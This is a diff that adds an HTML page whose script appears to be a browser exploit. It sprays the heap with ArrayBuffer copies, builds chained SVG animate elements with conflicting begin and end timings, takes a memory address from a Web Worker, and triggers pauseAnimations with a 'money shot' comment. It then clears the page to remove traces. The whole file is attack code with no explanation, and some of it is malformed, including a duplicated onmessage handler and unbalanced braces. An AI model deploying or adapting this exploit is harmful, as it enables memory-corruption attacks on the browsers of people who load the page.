@@ -1,0 +1,154 @@
+<html>
+<head>
+<meta charset="utf-8"/>
+<script>
+
+var worker = new Worker('/worker.js');
+var svgns = 'http://www.w3.org/2000/svg';
+var heap80 = new Array(0x5000);
+var heap100 = new Array(0x5000);
+var block80 = new ArrayBuffer(0x80);
+var block100 = new ArrayBuffer(0x100);
+var sprayBase = undefined;
+var arrBase = undefined;
+
+var animateX = undefined;
+var containerA = undefined;
+
+var milestone_offset = 0x90;
+
+var $ = function(id) { return document.getElementById(id); }
+
+var heap = function()
+{
+  var u32 = new Uint32Array(block80)
+
+  u32[4] = arrBase - milestone_offset;
+
+  u32[0xa] = arrBase + 0x1000 - milestone_offset;
+
+  u32[0x10] = arrBase + 0x2000 - milestone_offset;
+
+  var x = document.createElementNS(svgns, 'animate')
+  var svg = document.createElementNS(svgns, 'svg')
+
+  svg.appendChild(x)
+  svg.appendChild(x.cloneNode(true))
+
+  for (var i = 0; i < 0x400; i++)
+    {
+      var node = svg.cloneNode(true);
+      node.setAttribute('id', 'svg' + i)
+      document.body.appendChild(node);
+    }
+    
+    for (var i = 0; i < 0x4000; i++)
+      heap80[i] = block80.slice(0)
+  
+
+    for (var i = 0; i < 0x400; i++)
+      {
+        heap80[i + 0x3000] = block80.slice(0)
+        $('svg' + i).appendChild(x.cloneNode(true))
+      }
+
+      for (var i = 0; i < 0x400; i++)
+        {
+          $('svg' + i).appendChild(x.cloneNode(true))
+          $('svg' + i).appendChild(x.cloneNode(true))
+        }
+
+        for (var i = 0; i < heap100.length; i++)
+          heap100[i] = block100.slice(0)
+
+          
+    for (var i = 0x4401; i < heap80.length; i++)
+      heap80[i] = block80.slice(0)
+  
+
+          for (var i = 0x100; i < 0x400; i++)
+            $('svg' + i).appendChild(x.cloneNode(true))
+          }
+
+          var exploit = function()
+          {
+            heap();
+
+            animateX.setAttribute('begin', '59s')
+            animateX.setAttribute('begin', '58s')
+            animateX.setAttribute('begin', '10s')
+            animateX.setAttribute('begin', '9s')
+
+            // money shot
+
+            containerA.pauseAnimations();
+          }
+
+          worker.onmessage = function(e)
+          {
+          worker.onmessage = function(e)
+          {
+            window.setTimeout(function()
+            {
+              worker.terminate();
+              document.body.innerHTML = '';
+              document.getElementsByTagName('head')[0].innerHTML = '';
+              document.body.setAttribute('onload', '')
+              document.write('')
+              }, 1000);
+}
+
+arrBase = e.data;
+exploit();
+}
+
+
+var idGenerator = function()
+{
+return 'id' + (((1+Math.random())*0x10000)|0).toString(16).substring(1);
+}
+
+
+var craftDOM = function()
+{
+containerA = document.createElementNS(svgns, 'svg')
+var containerB = document.createElementNS(svgns, 'svg');
+
+animateX = document.createElementNS(svgns, 'animate')
+var animateA = document.createElementNS(svgns, 'animate')
+var animateB = document.createElementNS(svgns, 'animate')
+
+var animateC = document.createElementNS(svgns, 'animate')
+
+var idX = idGenerator();
+var idA = idGenerator();
+var idB = idGenerator();
+var idC = idGenerator();
+
+animateX.setAttribute('id', idX);
+animateA.setAttribute('id', idA);
+animateA.setAttribute('end', '50s');
+animateB.setAttribute('id', idB);
+animateB.setAttribute('begin', '60s');
+animateB.setAttribute('end', idC + '.end');
+animateC.setAttribute('id', idC);
+animateC.setAttribute('begin', '10s');
+animateC.setAttribute('end', idA + '.end');
+
+containerA.appendChild(animateX)
+containerA.appendChild(animateA)
+containerA.appendChild(animateB)
+
+containerB.appendChild(animateC)
+
+document.body.appendChild(containerA);
+document.body.appendChild(containerB);
+}
+window.onload = craftDOM;
+
+</script>
+</head>
+<body>
+</body>
+</html>
+
